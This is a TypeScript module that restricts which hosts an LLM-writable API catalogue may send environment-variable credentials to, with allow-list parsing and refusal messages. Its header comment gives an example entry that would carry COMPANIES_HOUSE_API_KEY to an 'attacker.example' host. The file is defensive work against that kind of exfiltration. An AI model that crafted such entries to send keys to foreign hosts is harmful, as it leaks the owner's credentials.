/**
 * Env vars an API catalogue entry's `bearer-env` / `header-env` auth may
 * reference, and the ONLY hosts each may be sent to.
 *
 * SECURITY CHOKE POINT: catalogue entries are LLM-writable (api_register, or
 * datastore_save straight into api_catalog). A name allow-list alone stopped
 * an entry reaching for AUTH_SECRET, but not one that pairs an ALLOWED key with
 * a different base host — `{baseUrl: attacker.example, auth: {kind:
 * 'bearer-env', envVar: 'COMPANIES_HOUSE_API_KEY'}}` would carry that key to
 * the attacker, and the SSRF guard cannot help because the attacker's public
 * host is the registered target. So every allowed var is pinned to hosts, the
 * same way registry secrets are (`hostAllowed` in $lib/secrets/registry).
 *
 * Owner extension: `API_CATALOG_ALLOWED_ENV` is a comma-separated list of
 * `NAME@host` or `NAME@host1|host2`. A bare `NAME` (the old format) names no
 * host and therefore authorises none — it fails with a message saying so,
 * rather than silently trusting every host.
 */
const SEEDED: Record<string, string[]> = {
  COMPANIES_HOUSE_API_KEY: ['api.company-information.service.gov.uk'],
};

export function authEnvHostPins(env: NodeJS.ProcessEnv = process.env): Map<string, string[]> {
  const pins = new Map<string, string[]>(Object.entries(SEEDED).map(([k, v]) => [k, [...v]]));
  for (const item of (env.API_CATALOG_ALLOWED_ENV ?? '').split(',')) {
    const [name, hosts = ''] = item.trim().split('@');
    if (!name) continue;
    const list = hosts.split('|').map((h) => h.trim().toLowerCase().replace(/\.$/, '')).filter(Boolean);
    pins.set(name, [...(pins.get(name) ?? []), ...list]);
  }
  return pins;
}

/**
 * Why `envVar` may not be sent to `host`, or null when it may. Exact host
 * match: a key pinned to `api.example.com` is not valid for `example.com` or
 * `evil.api.example.com`.
 */
export function authEnvRefusal(envVar: string, host: string, env: NodeJS.ProcessEnv = process.env): string | null {
  const pins = authEnvHostPins(env);
  const hosts = pins.get(envVar);
  if (!hosts) {
    return (
      `env var ${envVar} is not on the API-auth allowlist. Add it to API_CATALOG_ALLOWED_ENV as ` +
      `${envVar}@<host> (owner action), or better: register the credential in the secret registry at ` +
      `/admin/ai/apis and use auth {kind:"secret",handle:"…"}, which is host-bound.`
    );
  }
  const target = host.toLowerCase().replace(/\.$/, '');
  if (!hosts.includes(target)) {
    return hosts.length
      ? `env var ${envVar} is pinned to ${hosts.join(', ')} and cannot be sent to ${target}.`
      : `env var ${envVar} is allowed without a host. Pin it as ${envVar}@<host> in API_CATALOG_ALLOWED_ENV.`;
  }
  return null;
}
